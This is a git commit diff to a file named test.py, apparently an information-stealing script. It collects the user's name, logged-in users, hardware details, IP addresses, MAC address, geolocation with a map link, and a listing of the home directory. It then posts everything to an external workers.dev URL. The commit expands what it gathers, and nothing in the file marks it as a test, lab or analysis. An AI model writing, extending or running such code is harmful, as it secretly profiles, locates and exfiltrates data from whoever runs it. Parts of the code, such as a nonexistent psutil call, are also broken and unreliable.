86a9304fdcbf46168d2b06317d0621f5eeacdff1
mn7god <127699732+mn7god@users.noreply.github.com>
2026-03-08 11:09:30 -0300

    Update test.py

--- test.py
+++ test.py
@@ -7,13 +7,15 @@ import getpass
 import platform
 import datetime
 import requests
-exe = pathlib.Path(sys.executable).name
+home = pathlib.Path.home()
 def run_paths():
 	f = []
 	d = []
-	for p, file in Path.home().glob("*"):
-		d.append(p)
-		f.append(file)
+	for p in home.glob("*"):
+		if p.is_dir():
+			d.append(str(p))
+		elif p.is_file():
+			f.append(str(p))
 	return d, f
 def get_ip():
     try:
@@ -43,24 +45,43 @@ def ip_info():
 		j = json.loads(r.text)
 		return j
 	return None
+def logged():
+	u = []
+	for it in psutil.users():
+		u.append(it.name)
+	return u
+user = getpass.getuser()
+exe = pathlib.Path(sys.executable).name
 pts = run_paths()
 time = datetime.datetime.now().strftime("%d/%m/%Y - %H:%M:%S")
 i = get_ip()
 i_info = ip_info()
+lo = str(logged()).replace("[","").replace("]","")
+cc = psutil.cpu_count()
+cf = psutil.cpu_frequency().current
+ram = psutil.virtual_memory().total // 1024 // 1024
+i4 = str(i[0]).replace("[","").replace("]","")
+i6 = str(i[1]).replace("[","").replace("]","")
+mc = str(i[2]).replace("[","").replace("]","")
+sy = platform.system()
+nd = platform.node()
+re = platform.release()
+d_path = str(pts[0]).replace("[","").replace("]","").replace(",","\r\n")
+f_path = str(pts[1]).replace("[","").replace("]","").replace(",","\r\n")
 payload = f"""
 *------- USER DATA -------*
 
 Execution time: {time}
 
-User: {getpass.getuser()}
+User: {user}
 
-Logged Users: {psutil.users()}
+Logged Users: {lo}
 
-CPU: {psutil.cpu_count()}
+CPU: {cc}
 
-CPU Frequency: {psutil.cpu_freq()}
+CPU Frequency: {cf}
 
-RAM: {psutil.virtual_memory().total // 1024 // 1024}MB
+RAM: {ram}MB
 
 Public IP: {public_ip()}
 
@@ -76,29 +97,30 @@ Organization: {i_info['org']}
 
 Alias: {i_info['as']}
 
-IPv4: {str(i[0]).replace("[","").replace("]","")}
+IPv4: {i4}
 
-IPv6: {str(i[1]).replace("[","").replace("]","")}
+IPv6: {i6}
 
-MAC: {str(i[2]).replace("[","").replace("]","")}
+MAC: {mc}
 
-System: {platform.system()}
+System: {sy}
 
-Node: {platform.node()}
+Node: {nd}
 
-Version: {platform.release()}
+Version: {re}
 
 Google Maps Link: https://www.google.com/maps/search/?q={i_info['lat']},{i_info['lon']}
 
 **------- Files And Directories -------**
 
-{str(pts[0]).replace("[","").replace("]","").replace(",","\r\n")}
+{d_path}
 
-{str(pts[1]).replace("[","").replace("]","").replace(",","\r\n")}
+{f_path}
 
 **-------------------------------------**
 """
 content = json.dumps({"msg": payload})
 r = requests.post("https://curly-dream-4ac6.encrypteddev111k.workers.dev/", data=content)
 if r.status_code == 200:
+	print("yes")
 	
